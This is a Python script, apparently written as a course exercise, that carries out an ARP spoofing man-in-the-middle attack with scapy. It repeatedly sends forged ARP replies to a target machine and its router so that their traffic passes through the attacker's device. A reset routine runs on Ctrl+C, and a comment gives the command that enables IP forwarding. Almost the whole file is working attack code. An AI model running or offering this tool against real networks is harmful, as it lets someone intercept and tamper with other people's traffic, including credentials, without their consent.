#!usr/bin/env python
# ARP SPOOFER PROGRAM
#-- PERSONAL NOTES --
# ARP IS UNSECURE (CLIENT DEVICES AUTO ACCEPT REQUESTS/RESPONSES)
# ARP DOES NOT REQUIRE VERIFICATION FROM WHO IT'S COMING FROM
# AFTER TWO DEVICES HAVE BEEN SPOOFED, YOU ARE THE MITM (MAIN THE MIDDLE), (TARGET DEVICE->YOUR DEVICE->TARGET_ROUTER)
#-- END OF NOTES --
import scapy.all as scapy
import time

# refer to network_scanner.py scan() for notes
def get_mac(ip):
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request = scapy.ARP(pdst=ip)
    arp_request_broadcast = broadcast/arp_request
    # verbose=False prevents any output (ex: 'Sending 1 Packet') from printing on the terminal
    answered, unanswered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    #gets MAC address of target device
    return answered[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    #op=1(arp request),op=2(arp response),psrc(source of packet)
    #if printed, 'ARP is at 08:00:27:47:50:56 (your mac) says 10.0.2.1 (impersonated ip-router)', target device auto updates MAC of 10.0.2.1 to your MAC (08:00:27:47:50:56)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #sends ARP response to target device, use arp -a on target device before and after running this program to check for changes on 10.0.2.1
    scapy.send(packet, verbose=False)

#restore the correct ip/mac address to target_device/router
def restore(destination_ip, source_ip):
    #gets mac address of the device you want to update its arp table
    destination_mac = get_mac(destination_ip)
    #gets the actual mac address of the device that you want to pair with the correct IP address
    source_mac = get_mac(source_ip)
    #response packet sent to target devices to fix their arp tables, hwsrc is by default your mac address, needs to be set to correct mac address of 10.0.2.1
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    #sends packet, count=4 sents packet four times to make sure the target device recieves it
    scapy.send(packet, count=4, verbose=False)

# total number of arp response packets sent
sent_packets_count = 0
target_ip = '10.0.2.8'
gateway_ip = '10.0.2.1'

try:
    # without while loop, the router and target device will only be tricked once, and the arp tables of both will auto correct to the actual IP addresses
    while True:
        # tricks target device into thinking my device is the router
        spoof(target_ip, gateway_ip)
        # tricks router into thinking my device is the target device
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        # (MUST BE RUN USING python3 __) end='' keeps printing on same line, \r prints statement at the start of the line instead of where the cursor is (overwrites existing line)
        print('\r[+] Sent {} packets in total'.format(str(sent_packets_count)), end="")
        # prevents too many packets from being sent too fast
        time.sleep(2)
#the try block of code keeps executed until ctrl + C is pressed, then run this
except KeyboardInterrupt:
    print('\n[+] Detected CTRL + C .... Resetting ARP tables\n')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
# type in 'echo 1 > /proc/sys/net/ipv4/ip_forward' in terminal to forward request packets to router,
